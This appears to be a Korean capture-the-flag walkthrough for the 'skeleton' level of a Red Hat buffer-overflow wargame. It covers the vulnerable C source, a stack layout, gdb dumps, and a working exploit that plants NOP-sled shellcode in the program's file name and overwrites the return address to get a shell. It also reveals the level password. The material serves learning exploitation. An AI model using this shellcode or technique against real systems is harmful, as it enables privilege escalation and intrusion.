============================================================================================================
[redhat-lob] (10) skeleton
============================================================================================================


.. graphviz::

    digraph foo {
        a -> b -> c -> d -> e;

        a [shape=box, label="argv[1] value"];
        b [shape=box, color=lightblue, label="strcpy"];
        c [shape=box, label="Buffer Overflow"];
        d [shape=box, label="RET"];
        e [shape=box, label="program name address"];
    }

|

Source Code
============================================================================================================


.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>

    extern char **environ;

    main(int argc, char *argv[])
    {
        char buffer[40];
        int i, saved_argc;

        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
            memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
            printf("stack is still your friend.\n");
            exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
            printf("argument is too long!\n");
            exit(0);
        }

        // argc saver
        saved_argc = argc;

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

        // ultra argv hunter!
        for(i=0; i<saved_argc; i++)
            memset(argv[i], 0, strlen(argv[i]));
    }

|

Vulnerabliity Vector
============================================================================================================

스택 메모리 공간에 다음과 같이 들어가게 된다.

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte) 
    SFP     (4byte)
    RET     (4byte)  <- strcpy overflow
    argc    (4byte)  <- 0x00000002
    argv[0] (4byte)  <- argv[0] address
    argv[1] (4byte)  <- argv[1] address
    ----------------
    HIGH    
    ================

|

Segmentation fault
============================================================================================================

Overflow condition 

- environ을 초기화하여 환경 변수 사용를 통한 쉘코드 삽입이 불가능하다.
- argv[1] value의 47번째 문자가 "\\xbf"이어야 함
- argv[1] 값의 길이가 48 미만 이어야 함
- argv[0] 값, argv[1] 값을 초기화하여 argv[0], argv[1] 주소로 버퍼오버플로우를 진행할 수 없다.


.. code-block:: console

    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행.
    $ bash2

    $ ./skeleton `python -c 'print "a"*47'`
    stack is still your friend.

    $ ./skeleton `python -c 'print "a"*47+"\xbf"'`
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒
    Segmentation fault


|

exploit
============================================================================================================


프로그램 이름에 쉘코드 삽입
------------------------------------------------------------------------------------------------------------

기존에 사용한 쉘코드에는 "\\x2f" 값이 있기 때문에 정상적으로 쉘코드가 동작하지 않는다.

"\\x2f"가 없는 쉘코드로 파일명을 생성하도록 한다.

.. code-block:: console
    
    $ ln skeleton2 `python -c 'print "\x90"*40+"\x31\xc0\x50\xba\x11\x11\x11\x11\x81\xc2\x1e\x1e\x62\x57\x52\xba\x11\x11\x11\x11\x81\xc2\x1e\x51\x58\x5d\x52\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`

    $ gdb -q `python -c 'print "\x90"*40+"\x31\xc0\x50\xba\x11\x11\x11\x11\x81\xc2\x1e\x1e\x62\x57\x52\xba\x11\x11\x11\x11\x81\xc2\x1e\x51\x58\x5d\x52\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`

    (gdb) b* main
    Breakpoint 1 at 0x8048500
    (gdb) r `python -c 'print "a"*47+"\xbf"'`
    Starting program: /home/vampire/▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒P▒▒▒bWR▒▒▒QX]R▒▒PS▒▒1Ұ
                                             ̀ `python -c 'print "a"*47+"\xbf"'`

    /bin/bash: /home/troll/.bashrc: Permission denied

    Breakpoint 1, 0x8048500 in main ()
    (gdb) x/100x $esp

    ==========================================================================
    0xbffffa0c:     0x400309cb      0x00000002      0xbffffa54      0xbffffa60
    0xbffffa1c:     0x40013868      0x00000002      0x08048450      0x00000000
    0xbffffa2c:     0x08048471      0x08048500      0x00000002      0xbffffa54
    0xbffffa3c:     0x08048390      0x080486ac      0x4000ae60      0xbffffa4c
    0xbffffa4c:     0x40013e90      0x00000002      0xbffffb4c      0xbffffbe6
    0xbffffa5c:     0x00000000      0xbffffc17      0xbffffc39      0xbffffc43
    0xbffffa6c:     0xbffffc51      0xbffffc70      0xbffffc80      0xbffffc99
    0xbffffa7c:     0xbffffcb4      0xbffffcbf      0xbffffccd      0xbffffd0e
    (중략)
    0xbfffff5c:     0x35333b31      0x682f003a      0x2f656d6f      0x706d6176
    0xbfffff6c:     0x2f657269      0x90909090      0x90909090      0x90909090
    0xbfffff7c:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbfffff8c:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbfffff9c:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbfffffac:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbfffffbc:     0x90909090      0x90909090      0x90909090      0x90909090
    0xbfffffcc:     0x90909090      0x90909090      0xba50c031      0x11111111
    0xbfffffdc:     0x1e1ec281      0xba525762      0x11111111      0x511ec281
    0xbfffffec:     0x89525d58      0x895350e3      0xb0d231e1      0x0080cd0b
    0xbffffffc:     0x00000000      Cannot access memory at address 0xc0000000
    ==========================================================================

program명 주소를 찾아서 RET로 덮어씌우면 됩니다.


RET 주소를 프로그램 이름이 존재하는 주소로 변경하여 공격 진행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte) <- "\x90"*40
    SFP     (4byte)  <- "\x90"*4
    RET     (4byte)  <- 프로그램 이름 주소
    argc    (4byte)  <- 0x00000002
    argv[0] (4byte)  <- argv[0] 주소
    argv[1] (4byte)  <- argv[1] 주소
    ......
    program name     <- 프로그램 이름
    NULL
    ----------------
    HIGH    
    ================

|

filename : nop(100 byte) + shellcode(39 byte) 

argv[1] : nop(44 byte) + argv[0] address

.. code-block:: console

    $ ./`python -c 'print "\x90"*100+"\x31\xc0\x50\xba\x11\x11\x11\x11\x81\xc2\x1e\x1e\x62\x57\x52\xba\x11\x11\x11\x11\x81\xc2\x1e\x51\x58\x5d\x52\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'` `python -c 'print "a"*44+"\xbc\xff\xff\xbf"'`
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒▒▒▒

    bash$ whoami
    skeleton
    bash$ my-pass
    euid = 510
    shellcoder
